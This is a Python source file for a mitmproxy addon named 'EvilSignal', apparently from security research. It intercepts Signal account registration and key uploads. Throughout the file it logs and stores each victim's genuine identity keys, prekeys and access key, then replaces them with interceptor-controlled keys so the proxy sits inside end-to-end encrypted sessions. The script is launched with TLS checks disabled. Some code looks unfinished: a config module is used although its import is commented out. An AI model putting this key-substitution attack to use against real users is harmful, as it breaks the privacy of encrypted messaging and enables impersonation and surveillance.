import base64
from copy import deepcopy

import mitmproxy.websocket
from mitmproxy import ctx
from mitmproxy.addonmanager import Loader
from mitmproxy.http import HTTPFlow, Request, Response, Headers
from mitmproxy.net.http.status_codes import RESPONSES
from dataclasses import dataclass
from typing import Optional, Union
import logging

# FORMAT = "[%(filename)s:%(lineno)s-%(funcName)20s()] %(message)s"
# logging.basicConfig(format=FORMAT)
# logging.getLogger('mitmproxy').
import time

# import config

from xepor import InterceptedAPI, RouteType, HTTPVerb, Router
import json
from signal_protocol import state, helpers
from signal_protocol.address import ProtocolAddress, DeviceId
from signal_protocol.identity_key import IdentityKeyPair, IdentityKey
from signal_protocol.curve import PublicKey, PrivateKey
from signal_protocol.sealed_sender import sealed_sender_decrypt
from signal_protocol import kem
from base64 import b64decode, b64encode

import src.utils as utils
from src.mitm_interface import MitmUser, MitmVisitenKarte, VisitenKarteType
from src.constants import TRUST_ROOT_STAGING_PK
from db.database import User, Device, LegitKeyRecord, StoreKeyRecord, VisitenKarte, ConversationSession
from db.session import DatabaseSessionManager
from enum import Enum
import parse

from protos.gen.SignalService_pb2 import Content, Envelope, DataMessage
from protos.gen.WebSocketResources_pb2 import WebSocketMessage, WebSocketRequestMessage, WebSocketResponseMessage
from signal_protocol.protocol import CiphertextMessage

from src.server_proto import addons, HOST_HTTPBIN
from src.mitm_interface import MitmUser
from collections import defaultdict


# logging.getLogger().addHandler(utils.ColorHandler())
# todo -- fix logging precedence -- https://stackoverflow.com/a/20280587
# logging.getLogger('passlib').setLevel(logging.ERROR)  # suppressing an issue coming from xepor -> passlib
# logging.getLogger('parse').setLevel(logging.ERROR)  # don't care
# logging.getLogger('peewee').setLevel(logging.WARN)  # peewee emits full SQL queries otherwise which is not great
# logging.getLogger('xepor.xepor').setLevel(logging.INFO)
# logging.getLogger('mitmproxy.proxy.server').setLevel(logging.WARN)  # too noisy


def dataMessageFlags(flags_value: int):
    from protos.gen.SignalService_pb2 import DataMessage

    # Check which flags are set in the flags_value
    flags_set = {
        "END_SESSION": bool(flags_value & DataMessage.END_SESSION),
        "EXPIRATION_TIMER_UPDATE": bool(flags_value & DataMessage.EXPIRATION_TIMER_UPDATE),
        "PROFILE_KEY_UPDATE": bool(flags_value & DataMessage.PROFILE_KEY_UPDATE),
    }
    return flags_set


class CiphertextMessageType(Enum):
    WHISPER = 2
    PRE_KEY_BUNDLE = 3
    SENDER_KEY_DISTRIBUTION = 7
    PLAINTEXT = 8


class ContentHint(Enum):
    DEFAULT = 0  # This message has content, but you shouldn't expect it to be re-sent to you
    RESENDABLE = 1  # You should expect to be able to have this content be re-sent to you
    IMPLICIT = 2  # This message has no real content and likely cannot be re-sent to you


class EnvelopeType(Enum):
    # https://github.com/signalapp/Signal-Android/blob/main/libsignal-service/src/main/protowire/SignalService.proto#L14-L23
    UNKNOWN = 0
    CIPHERTEXT = 1
    KEY_EXCHANGE = 2
    PRE_KEY_BUNDLE = 3
    RECEIPT = 5
    UNIDENTIFIED_SENDER = 6
    reserved_SENDERKEY_MESSAGE = 7
    PLAINTEXT_CONTENT = 8


@dataclass
class PendingWebSocket:
    request: WebSocketRequestMessage = None
    response: WebSocketResponseMessage = None


websocket_open_state = defaultdict(PendingWebSocket)


@dataclass
class KeyData:
    IdenKey: Optional[str] = None
    SignedPreKey: Optional[dict] = None
    pq_lastResortKey: Optional[dict] = None
    PreKeys: Optional[list[dict]] = None
    pq_PreKeys: Optional[list[dict]] = None

    # fake_IdenKey: Optional[str] = None
    # fake_signed_pre_key: Optional[dict] = None
    # fake_signed_pre_key_secret: Optional[str] = None

    # fake_PreKeys: Optional[list[dict]] = None
    # fake_secret_PreKeys: Optional[dict] = None

    # fake_pq_PreKeys: Optional[list[dict]] = None
    # fake_secret_pq_PreKeys: Optional[dict] = None

    # fake_last_resort_key: Optional[dict] = None
    # fake_secret_last_resort_key: Optional[str] = None


@dataclass
class RegistrationInfo:
    aci: Optional[str] = None
    pni: Optional[str] = None
    unidentifiedAccessKey: Optional[str] = None
    registrationId: Optional[int] = None
    pniRegistrationId: Optional[int] = None

    aciData: KeyData = None
    pniData: KeyData = None

    victim: MitmUser = None

    #serialized_registration_req: Optional[dict] = None


@dataclass
class BobIdenKey:
    uuid: str
    identityKey: Optional[IdentityKeyPair] = None
    fake_identityKey: Optional[IdentityKeyPair] = None


registration_info: dict[str, RegistrationInfo] = None
conversation_session: dict[str, (MitmUser, MitmUser)] = dict()
bobs_bundle = dict()
REGISTRATION_INFO_PATH = "registration_info.json"

api = addons[0]


class EvilSignal(InterceptedAPI):
    wrapped_api = None

    local_registrations = dict()

    def __init__(self, wrapped_api: InterceptedAPI):
        self.wrapped_api = wrapped_api
        logging.info(f"++++++++++++++++++++++++\nSTARTING mitm against: \n{HOST_HTTPBIN}\n++++++++++++++++++++++++")
        super().__init__(
            default_host=wrapped_api.default_host,
            host_mapping=wrapped_api.host_mapping,
            blacklist_domain=wrapped_api.blacklist_domain,
            request_passthrough=wrapped_api.request_passthrough,
            response_passthrough=wrapped_api.response_passthrough,
            respect_proxy_headers=wrapped_api.respect_proxy_headers,
        )
        if self.wrapped_api is not None:
            for route in self.wrapped_api.request_routes.routes:
                host, path, method, handler, allowed_statuses = route
                self.request_routes.add_route(host, path, method, handler, allowed_statuses)
            for route in self.wrapped_api.response_routes.routes:
                host, path, method, handler, allowed_statuses = route
                self.response_routes.add_route(host, path, method, handler, allowed_statuses)
            for route in self.wrapped_api.ws_request_routes.routes:
                host, path, mtype, handler = route
                self.ws_request_routes.add_route(host, path, mtype, handler)
            for route in self.wrapped_api.ws_response_routes.routes:
                host, path, mtype, handler = route
                self.ws_response_routes.add_route(host, path, mtype, handler)

    def load(self, loader: Loader):
        loader.add_option(
            name="registration_info",
            typespec=dict,
            default={},
            help="Registration data of the ",
        )

        super().load(loader)  # pass remaining to


api = EvilSignal(api)


def json_to_registrations(json_registrations: str) -> dict[str, RegistrationInfo]:
    loaded_dict = json.loads(json_registrations)
    return {key: utils.json_to_dataclass(RegistrationInfo, value) for key, value in loaded_dict.items()}


@api.route("/v1/registration", rtype=RouteType.REQUEST)
def _v1_registration(flow: HTTPFlow):
    req = json.loads(flow.request.content)
    ip_address = flow.client_conn.peername[0]

    reg_info = api.local_registrations

    try:
        user_registration_info = reg_info[ip_address]
    except KeyError:
        user_registration_info = RegistrationInfo()

    user_registration_info.victim = MitmUser(
        protocol_address=ProtocolAddress(
            name=req["sessionId"],
            device_id=1,
        ),
        aci_uuid="",
        pni_uuid="",
    )

    user_registration_info.victim.get_aci_visitenkarte()._registration_id = req["accountAttributes"]["registrationId"]
    user_registration_info.victim.get_pni_visitenkarte()._registration_id = req["accountAttributes"][
        "pniRegistrationId"
    ]

    # Save all the legit data for later use
    #user_registration_info.serialized_registration_req = flow.request.content
    user_registration_info.registrationId = req["accountAttributes"]["registrationId"]
    user_registration_info.pniRegistrationId = req["accountAttributes"]["pniRegistrationId"]
    user_registration_info.unidentifiedAccessKey = req["accountAttributes"]["unidentifiedAccessKey"]

    user_registration_info.victim._unidentified_access_key = req["accountAttributes"]["unidentifiedAccessKey"]

    #print("Unidentified Access Key: ", user_registration_info.unidentifiedAccessKey)

    user_registration_info.aciData = KeyData(
        IdenKey=req["aciIdentityKey"],
        SignedPreKey=req["aciSignedPreKey"],
        pq_lastResortKey=req["aciPqLastResortPreKey"],
    )
    user_registration_info.pniData = KeyData(
        IdenKey=req["pniIdentityKey"],
        SignedPreKey=req["pniSignedPreKey"],
        pq_lastResortKey=req["pniPqLastResortPreKey"],
    )

    reg_info[ip_address] = user_registration_info
    api.local_registrations = reg_info

    # Swap fake keys

    req["aciIdentityKey"] = (
        user_registration_info.victim.get_identity_key(VisitenKarteType.ACI).public_key().to_base64()
    )
    req["pniIdentityKey"] = (
        user_registration_info.victim.get_identity_key(VisitenKarteType.PNI).public_key().to_base64()
    )

    req["aciSignedPreKey"]["publicKey"] = (
        user_registration_info.victim.get_aci_visitenkarte().get_signed_pre_key_record().public_key().to_base64()
    )
    req["aciSignedPreKey"]["signature"] = base64.b64encode(
        user_registration_info.victim.get_aci_visitenkarte().get_signed_pre_key_record().signature()
    ).decode()

    req["pniSignedPreKey"]["publicKey"] = (
        user_registration_info.victim.get_pni_visitenkarte().get_signed_pre_key_record().public_key().to_base64()
    )
    req["pniSignedPreKey"]["signature"] = base64.b64encode(
        user_registration_info.victim.get_pni_visitenkarte().get_signed_pre_key_record().signature()
    ).decode()

    req["aciPqLastResortPreKey"]["publicKey"] = (
        user_registration_info.victim.get_aci_visitenkarte().get_last_resort_kyber_pre_key().public_key().to_base64()
    )
    req["aciPqLastResortPreKey"]["signature"] = base64.b64encode(
        user_registration_info.victim.get_aci_visitenkarte().get_last_resort_kyber_pre_key().signature()
    ).decode()

    req["pniPqLastResortPreKey"]["publicKey"] = (
        user_registration_info.victim.get_pni_visitenkarte().get_last_resort_kyber_pre_key().public_key().to_base64()
    )
    req["pniPqLastResortPreKey"]["signature"] = base64.b64encode(
        user_registration_info.victim.get_pni_visitenkarte().get_last_resort_kyber_pre_key().signature()
    ).decode()

    flow.request.content = json.dumps(req).encode()


@api.route("/v1/registration", rtype=RouteType.RESPONSE)
def _v1_registration(flow: HTTPFlow):
    # todo - move to discrete route once xepor matching bug is fixed
    status = flow.response.status_code
    seconds_left = flow.response.headers.get("Retry-After", -1)
    fail_cases = {
        403: "Verification failed for the provided Registration Recovery Password",
        409: "The caller has not explicitly elected to skip transferring data from another device, but a device transfer is technically possible",
        422: "The request did not pass validation: `isEverySignedKeyValid` (https://github.com/signalapp/Signal-Server/blob/9249cf240e7894b54638784340231a081a2e4eda/service/src/main/java/org/whispersystems/textsecuregcm/entities/RegistrationRequest.java#L100-L106) failed",
        423: "Registration Lock failure.",
        429: f"Too many attempts, try after {utils.human_time_duration(seconds_left)} ({seconds_left} seconds)",
    }
    if status in fail_cases:
        resp_name = f"({RESPONSES[status]})" if status in RESPONSES else ""
        logging.warning(
            f"Registration failed with error code {status} {resp_name} -- {fail_cases[status]}\n{flow.response.content}"
        )
        return

    req = json.loads(flow.response.content)
    ip_address = flow.client_conn.peername[0]

    registration_info: RegistrationInfo = api.local_registrations[ip_address]

    registration_info.victim.get_aci_visitenkarte()._uuid = req["uuid"]
    registration_info.victim.get_pni_visitenkarte()._uuid = req["pni"]
    registration_info.victim._phone_number = req["number"]

    registration_info.aci = req["uuid"]
    registration_info.pni = req["pni"]

    registration_info.victim._protocol_address = ProtocolAddress(name=req["uuid"], device_id=1)

    api.local_registrations[ip_address] = registration_info

    logging.info(f"Registration successful {api.local_registrations[ip_address]}")


@api.route("/v2/keys", rtype=RouteType.REQUEST, method=HTTPVerb.PUT)
def _v2_keys(flow: HTTPFlow):
    identity = flow.request.query["identity"]
    identity_type = VisitenKarteType.ACI if identity == "aci" else VisitenKarteType.PNI
    req = json.loads(flow.request.content)
    address = flow.client_conn.peername[0]

    logging.info(req["preKeys"][0])

    registration_info = api.local_registrations

    ## TODO: instead of naming each key for both variables, just use the identifier as a key and the bundle(dict) as the value
    if not registration_info.get(address):
        logging.error(
            f"Address {address} not found in registration_info. {registration_info}"
        ) 
        return

    user_registration_info: RegistrationInfo = registration_info.get(address)

    key_data = user_registration_info.aciData if identity == "aci" else user_registration_info.pniData

    key_data.PreKeys = req["preKeys"]
    key_data.pq_PreKeys = req["pqPreKeys"]

    alice = user_registration_info.victim

    alice.get_visitenkarte(identity_type).update_kyber_pre_keys(key_data.pq_PreKeys[0]["keyId"])
    alice.get_visitenkarte(identity_type).update_pre_keys(key_data.PreKeys[0]["keyId"])

    req["preKeys"] = alice.get_visitenkarte(identity_type).serialize_pre_keys()
    req["pqPreKeys"] = alice.get_visitenkarte(identity_type).serialize_kyber_pre_keys()

    logging.info(req["preKeys"][0])
    logging.info(alice.get_visitenkarte(identity_type)._pre_key_records[0].public_key().to_base64())
    logging.info(alice.get_visitenkarte(identity_type)._kyber_pre_key_records[0].public_key().to_base64())

    flow.request.content = json.dumps(req).encode()


@api.route("/v2/keys", rtype=RouteType.RESPONSE)
def v2_keys_errors(flow: HTTPFlow):
    status = flow.response.status_code
    address = flow.client_conn.peername[0]
    identity_type = VisitenKarteType.ACI if flow.request.query["identity"] == "aci" else VisitenKarteType.PNI
    other_identity_type = VisitenKarteType.PNI if identity_type == VisitenKarteType.ACI else VisitenKarteType.ACI
    failcases = {
        401: "Account authentication check failed.",
        403: "Attempt to change identity key from a non-primary device.",
        422: "Invalid request format (Invalid signatures -- not all sigs [pqPreKeys,pqLastResortPreKey,signedPreKey] are valid).",
    }
    if status in failcases:
        resp_name = f"({RESPONSES[status]})" if status in RESPONSES else ""
        logging.warning(
            f"Registration failed with error code {status} {resp_name} -- {failcases[status]}\n{flow.request.content}"
        )

    #### check registration info if the it is the last response of v2/keys

    user_info: RegistrationInfo = api.local_registrations[address]
    
    key_data = user_info.aciData if identity_type == VisitenKarteType.ACI else user_info.pniData
    other_key_data = user_info.aciData if other_identity_type == VisitenKarteType.ACI else user_info.pniData

    if (other_key_data.PreKeys == None):
        return

    ## commit to DB

    ############## Legit Records ##############

    serialized_legit_record = {}
    serialized_legit_record["uuid"] = user_info.aci if identity_type == VisitenKarteType.ACI else user_info.pni
    serialized_legit_record["type"] = identity_type.value
    serialized_legit_record["signedPreKey"] = key_data.SignedPreKey
    serialized_legit_record["preKey"] = key_data.PreKeys
    serialized_legit_record["pqPreKey"] = key_data.pq_PreKeys
    serialized_legit_record["PqLastResortPreKey"] = key_data.pq_lastResortKey
    serialized_legit_record["deviceId"] = 1
    serialized_legit_record["registrationId"] = user_info.registrationId if identity_type == VisitenKarteType.ACI else user_info.pniRegistrationId
    serialized_legit_record["identityKey"] = key_data.IdenKey


    identity_legit_key_record = LegitKeyRecord.model_validate(serialized_legit_record)

    other_serialized_legit_record = {}
    other_serialized_legit_record["uuid"] = user_info.aci if other_identity_type == VisitenKarteType.ACI else user_info.pni
    other_serialized_legit_record["type"] = other_identity_type.value
    other_serialized_legit_record["signedPreKey"] = other_key_data.SignedPreKey
    other_serialized_legit_record["preKey"] = other_key_data.PreKeys
    other_serialized_legit_record["pqPreKey"] = other_key_data.pq_PreKeys
    other_serialized_legit_record["PqLastResortPreKey"] = other_key_data.pq_lastResortKey
    other_serialized_legit_record["deviceId"] = 1
    other_serialized_legit_record["registrationId"] = user_info.registrationId if other_identity_type == VisitenKarteType.ACI else user_info.pniRegistrationId
    other_serialized_legit_record["identityKey"] = other_key_data.IdenKey

    other_legit_key_record = LegitKeyRecord.model_validate(other_serialized_legit_record)

    ############## User ##############
    #print("User Info: ", user_info)
    #print("User Info Victim: ", user_info.victim._unidentified_access_key)
    user_info.victim.save_user()

    session_manager = DatabaseSessionManager()
    session = session_manager.get_session()

    with session as s:
        s.merge(identity_legit_key_record)
        s.merge(other_legit_key_record)

        s.commit()

@api.route("/v2/keys/{identifier}/{device_id}", rtype=RouteType.RESPONSE, method=HTTPVerb.GET, allowed_statuses=[200])
def v2_keys_identifier_device_id(flow: HTTPFlow, identifier: str, device_id: str):

    address = flow.client_conn.peername[0]
    user_info: RegistrationInfo = api.local_registrations[address]
    
    ## check if the keybundle is from already registered (legit or victim) user in the database
    with DatabaseSessionManager() as session_manager:
        session = session_manager.get_session()
        user = User.get_user_by_uuid(identifier, session)


    if user_info.victim.get_aci_visitenkarte()._uuid == identifier:
        key_data = user_info.victim.get_aci_visitenkarte()
    else:
        key_data = user_info.victim.get_pni_visitenkarte()

    victim = user_info.victim
    
    api.local_registrations[address] = user_info

addons = [api]

from mitmproxy.tools.main import mitmdump

if __name__ == "__main__":

    flow_name = f"debug_{int(time.time())}.flow"
    f = open(REGISTRATION_INFO_PATH, "wb")
    f.write(b"{}")
    f.close()

    params = [
        # "-q",   # quiet flag, only script's output
        "--mode",
        "transparent",
        "--showhost",
        "--ssl-insecure",
        "--ignore-hosts",
        config.IGNORE_HOSTS,
        "-s",  # script flag
        __file__,  # use the same file as the hook
        # "-r",
        # "mitmproxy_flows/PQ_registration"
        "-w",
        flow_name,
    ]
    mitmdump(params)
